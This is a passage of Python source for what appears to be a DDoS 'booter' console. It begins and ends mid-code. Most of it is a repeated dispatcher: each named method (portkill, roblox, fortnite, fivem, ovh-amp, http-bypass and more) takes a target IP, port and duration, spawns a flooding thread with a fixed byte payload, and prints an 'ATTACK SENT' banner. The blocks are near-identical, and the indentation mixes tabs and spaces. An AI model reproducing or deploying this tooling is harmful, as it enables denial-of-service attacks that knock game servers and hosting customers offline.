║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
                main()
        elif sinput == "portkill":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "roblox":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "prodigy-wra":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "fortnite":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "fivem":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "nfokill":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "100up":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "ovh-strong":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "http-bypass":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "ovh-tcp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "ovh-v2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "ovh-amp":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "http-get":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "hydra":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "ovh-down":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "syndemonic":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
        elif sinput == "http-rand":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
